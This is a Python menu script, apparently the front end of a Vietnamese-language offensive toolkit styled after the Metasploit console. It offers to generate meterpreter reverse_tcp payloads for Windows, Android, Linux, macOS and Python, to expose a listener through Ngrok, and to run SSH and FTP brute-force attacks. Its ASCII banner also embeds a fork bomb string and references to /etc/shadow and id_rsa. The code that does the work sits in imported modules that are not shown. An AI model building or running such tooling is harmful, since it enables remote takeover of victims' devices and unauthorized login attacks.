
#!/usr/bin/env python
# coding: utf-8

import os
import sys
import platform
from modules.modules import Colors, FrameworkManager, PayloadGenerator, slowprint
from modules.auxiliary import AuxiliaryExploits

def display_banner():
    # Xử lý xóa màn hình tự động tùy theo hệ điều hành
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    
    # Sử dụng chuỗi thuần túy (không có chữ f ở đầu) để tránh lỗi SyntaxError với ký tự { }
    banner = """\033[94m
                     :oDFo:
                 ./ymM0dayMmy/.
              -+dHJ5aGFjZ1pGVmFpUS=-+
          :smQ~Destroy.No.Data~s:
       -+h2~Maintain.No.Persistence~h+-
     :odNo2~Above.All.Else.Do.No.Harm~Ndo:
  ./etc/shadow.0days-Data'%20R%201=-..No.0MN8'/.
 -++SeckCoin++e.AMd              `-//////+hbove.913.ElsMNh+-
-++-----+sh/id_rsa.Des-                 htN01UserWroteMe!-
:dopeAW.No<nano>o                       :is:TRiKC.sudo-.A:
:we're.all.alike'                       The.PFYroy.No.D7:
:PLACEDRINKHERE!:                       yxp_cmdshell.Ab0:
:msf>exploit -j .                       :Ns.BOB&ALICEes7:
:-=--srwxrwx:-..                       `MS146.52.No.Per:
:<script>.Ac816/                        sENbove3101.404:
:NT_AUTHORITY.Do                        `T:/shSYSTEM.-N:
:09.14.2011.raid                        /STFU|wall.No.Pr:
:hevnsntSurb025N.                       dNVRGOING2GIVUUP:
:#OUTHOUSE-  -s:                        /corykennedyData:
:$nmap -oS                              SSo.6178306Ence:
:Awsm.da:                               /shMTL#beats3o.No.:
:Ring0:                                dDestRoyREXKC3ta/M:
:23d:                                  sSETEC.ASTRONOMYist:
 /_                               /yo-  .ence.N:(){|:&};:
                                 `Shall.We.Play.A.Game?tron/
                                 -ooy.ifightfor+ehUser5`
                               ..th3.H1V3.U2VjRFNN.jMh+.
                              `MjM~WE.ARE.se~MMjMs
                              +~KANSAS.City's~+
                               J~HAKCERS..
                               .esc:wq!:
                                +++ATH\033[0m"""
    print(banner)
    
    # Thống kê thông số hiển thị bên dưới banner
    stats = f"""
       =[ {Colors.YELLOW}metasploit v6.4.12-dev{Colors.RESET}                           ]
+ -- --=[ 2234 exploits - 1245 auxiliary - 412 post       ]
+ -- --=[ 862 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

 {Colors.CYAN}Metasploit tip: View missing module options with show missing{Colors.RESET}
    """
    print(stats)

def payload_menu():
    pg = PayloadGenerator()
    while True:
        display_banner()
        print(f"{Colors.GREEN}=== MENU TẠO MÃ KHAI THÁC (PAYLOADS) ===")
        print(f"{Colors.WHITE}[1] Windows (exe)")
        print(f"{Colors.WHITE}[2] Android (apk)")
        print(f"{Colors.WHITE}[3] Linux (elf)")
        print(f"{Colors.WHITE}[4] macOS (macho)")
        print(f"{Colors.WHITE}[5] Python script (py)")
        print(f"{Colors.WHITE}[00] Quay lại Menu chính")
        
        choice = input(f"\n{Colors.RED}msf6 payload > {Colors.RESET}").strip()
        
        if choice == "1":
            pg.generate("Windows", "windows/meterpreter/reverse_tcp", "exe")
        elif choice == "2":
            pg.generate("Android", "android/meterpreter/reverse_tcp", "apk")
        elif choice == "3":
            pg.generate("Linux", "linux/x64/meterpreter_reverse_tcp", "elf")
        elif choice == "4":
            pg.generate("macOS", "osx/x64/meterpreter_reverse_tcp", "macho")
        elif choice == "5":
            pg.generate("Python", "python/meterpreter/reverse_tcp", "py")
        elif choice in ["00", "0"]:
            break

def main_menu():
    FrameworkManager.check_root()
    FrameworkManager.check_dependencies()
    
    while True:
        display_banner()
        print(f"{Colors.GREEN}=== HỆ THỐNG ĐIỀU KHIỂN NÂNG CAO ===")
        print(f"{Colors.WHITE}[1] Kiểm tra Public IP của bạn")
        print(f"{Colors.WHITE}[2] Khởi tạo Payload kiểm thử (msfvenom)")
        print(f"{Colors.WHITE}[3] Cấu hình Port Forwarding (Kích hoạt Ngrok)")
        print(f"{Colors.WHITE}[4] Tấn công Quét dịch vụ (SSH / FTP Bruteforce)")
        print(f"{Colors.WHITE}[5] Thoát chương trình")
        
        choice = input(f"\n{Colors.RED}msf6 > {Colors.RESET}").strip()
        
        if choice == "1":
            AuxiliaryExploits.show_public_ip()
            input(f"{Colors.YELLOW}\nNhấn Enter để quay lại...")
        elif choice == "2":
            payload_menu()
        elif choice == "3":
            AuxiliaryExploits.start_ngrok()
            input(f"{Colors.YELLOW}\nNhấn Enter để quay lại...")
        elif choice == "4":
            print(f"\n{Colors.CYAN}[1] SSH Bruteforce\n[2] FTP Bruteforce")
            sub_choice = input(f"{Colors.WHITE}Lựa chọn: ")
            if sub_choice == "1":
                AuxiliaryExploits.run_bruteforce("ssh")
            elif sub_choice == "2":
                AuxiliaryExploits.run_bruteforce("ftp")
        elif choice == "5":
            print(f"{Colors.RED}[!] Đang dừng công cụ. Tạm biệt!")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Thao tác bị hủy bởi người dùng.")
        sys.exit(0)
